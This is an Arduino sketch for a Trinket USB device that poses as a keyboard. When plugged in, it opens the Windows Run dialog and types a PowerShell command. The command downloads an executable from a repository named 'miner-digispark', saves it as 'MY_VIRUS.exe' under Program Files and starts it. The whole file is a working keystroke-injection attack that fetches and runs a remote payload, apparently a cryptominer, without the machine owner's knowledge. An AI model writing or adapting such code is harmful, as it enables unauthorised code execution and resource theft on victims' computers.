#include <TrinketKeyboard.h>

void setup() {
  TrinketKeyboard.begin();
  delay(200);
  winR();
  delay(100);
  winR();
  delay(300);
  TrinketKeyboard.print("powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sudox00/miner-digispark/refs/heads/main/NetMonitor.exe' -OutFile 'C:/Program Files/MY_VIRUS.exe'; Start-Process 'C:/Program Files/MY_VIRUS.exe'\"");
  pressEnter();
  delay(500);
  TrinketKeyboard.pressKey(0, 0x29);
  //TrinketKeyboard.pressKey(KEYCODE_MOD_RIGHT_GUI, KEYCODE_R);


}

void loop() {

}

void winR() {
  TrinketKeyboard.pressKey(0x08, 0x15);
  delay(30);
  TrinketKeyboard.pressKey(0,0);
}

void pressEnter() {
  TrinketKeyboard.pressKey(0, 0x28);
  delay(10);
  TrinketKeyboard.pressKey(0,0);
  delay(300);
}
